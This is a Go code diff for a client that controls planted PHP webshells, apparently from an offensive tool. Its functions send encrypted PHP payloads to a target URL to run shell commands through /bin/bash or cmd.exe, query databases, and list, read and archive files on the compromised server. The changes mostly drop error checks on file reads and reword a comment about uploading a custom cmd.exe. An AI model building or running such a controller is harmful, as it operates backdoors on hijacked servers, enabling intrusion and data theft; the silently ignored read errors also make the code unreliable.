@@ -19,15 +19,13 @@ func (s *PHPShell) FreshSession(id int, url string, password string) (string, er
 		PhpSessions = make(map[int]string)
 	}
 	// Get the target code and encrypt
-	code, err := os.ReadFile("./pkg/api/php/Check.php")
-	if err != nil {
-		return "", err
-	}
+	code, _ := os.ReadFile("./pkg/api/php/Check.php")
 	code = append(code, []byte("\nmain();")...) // add main() to call
 
 	// 加密code
 	enCode := util.Encrypt(string(code), password)
 
+	var err error
 	PhpSessions[id], err = util.PostRequestWithoutSession(url, password, enCode)
 	if err != nil {
 		return "", err
@@ -50,10 +48,7 @@ func (s *PHPShell) FreshSession(id int, url string, password string) (string, er
 // BaseInfo
 func (s *PHPShell) BaseInfo(id int, url string, password string) (string, error) {
 	// code := `echo getcwd();`
-	code, err := os.ReadFile("./pkg/api/php/BaseInfo.php")
-	if err != nil {
-		return "", err
-	}
+	code, _ := os.ReadFile("./pkg/api/php/BaseInfo.php")
 	code = fmt.Append(code, "\nmain();") // add main() to call
 
 	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
@@ -66,13 +61,10 @@ func (s *PHPShell) BaseInfo(id int, url string, password string) (string, error)
 
 // ExecCommand executes a command on the PHP shell and returns the output
 func (s *PHPShell) ExecCommand(id int, command string, url string, password string) (string, error) {
-	// Todo 需要支持自己上传cmd。有时候可以提权
+	// Todo 需要支持自己上传cmd。适用于某些情况c盘下的cmd.exe没有执行权限
 
 	// 1. first need to get the system type
-	code, err := os.ReadFile("./pkg/api/php/OS.php")
-	if err != nil {
-		return "", err
-	}
+	code, _ := os.ReadFile("./pkg/api/php/OS.php")
 	code = fmt.Append(code, "\nmain();")
 
 	osType, err := util.HookPost(url, password, string(code), PhpSessions[id])
@@ -80,17 +72,15 @@ func (s *PHPShell) ExecCommand(id int, command string, url string, password stri
 		return "", err
 	}
 
-	// 2. base on the osType, execute the command
-	code, err = os.ReadFile("./pkg/api/php/CMD.php")
-	if err != nil {
-		return "", err
-	}
-	var cmdPath string // if block-level scope, it must define at out
+	var cmdPath string // in if-block-level scope, it must define at out
 	if osType == "Linux" {
 		cmdPath = "/bin/bash"
 	} else {
 		cmdPath = "C:/Windows/System32/cmd.exe"
 	}
+
+	// 2. base on the osType, execute the command
+	code, _ = os.ReadFile("./pkg/api/php/CMD.php")
 	code = fmt.Appendf(code, "\nmain(\"%s\",\"true\",\"%s\");", cmdPath, command)
 
 	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
@@ -128,10 +118,7 @@ function encrypt($data, $key) {
 }
 
 func (s *PHPShell) ExecSql(id int, driver, host, port, user, pass, database, sql, option, encoding, url, password string) (string, error) {
-	code, err := os.ReadFile("./pkg/api/php/Database.php")
-	if err != nil {
-		return "", err
-	}
+	code, _ := os.ReadFile("./pkg/api/php/Database.php")
 
 	// step 1, database is "", get all dbname
 	if database == "" {
@@ -148,14 +135,10 @@ func (s *PHPShell) ExecSql(id int, driver, host, port, user, pass, database, sql
 		return "", err
 	}
 	return res, nil
-
 }
 
 func (s *PHPShell) FileZip(id int, srcPath string, toPath string, url string, password string) (string, error) {
-	code, err := os.ReadFile("./pkg/api/php/FileZip.php")
-	if err != nil {
-		return "", err
-	}
+	code, _ := os.ReadFile("./pkg/api/php/FileZip.php")
 	code = fmt.Appendf(code, "\nmain(\"%s\", \"%s\");", srcPath, toPath)
 	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
 	if err != nil {
@@ -165,10 +148,7 @@ func (s *PHPShell) FileZip(id int, srcPath string, toPath string, url string, pa
 }
 
 func (s *PHPShell) FileUnZip(id int, srcPath string, toPath string, url string, password string) (string, error) {
-	code, err := os.ReadFile("./pkg/api/php/FileUnZip.php")
-	if err != nil {
-		return "", err
-	}
+	code, _ := os.ReadFile("./pkg/api/php/FileUnZip.php")
 	code = fmt.Appendf(code, "\nmain(\"%s\", \"%s\");", srcPath, toPath)
 	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
 	if err != nil {
@@ -179,10 +159,7 @@ func (s *PHPShell) FileUnZip(id int, srcPath string, toPath string, url string, 
 
 // FileList lists all files in the current directory
 func (s *PHPShell) FileList(id int, path string, url string, password string) (string, error) {
-	code, err := os.ReadFile("./pkg/api/php/FileList.php")
-	if err != nil {
-		return "", err
-	}
+	code, _ := os.ReadFile("./pkg/api/php/FileList.php")
 	code = fmt.Appendf(code, "\nmain(\"%s\");", path)
 
 	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
@@ -193,10 +170,7 @@ func (s *PHPShell) FileList(id int, path string, url string, password string) (s
 }
 
 func (s *PHPShell) FileShow(id int, path string, url string, password string) (string, error) {
-	code, err := os.ReadFile("./pkg/api/php/FileShow.php")
-	if err != nil {
-		return "", err
-	}
+	code, _ := os.ReadFile("./pkg/api/php/FileShow.php")
 	code = fmt.Appendf(code, "\nmain(\"%s\");", path)
 
 	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
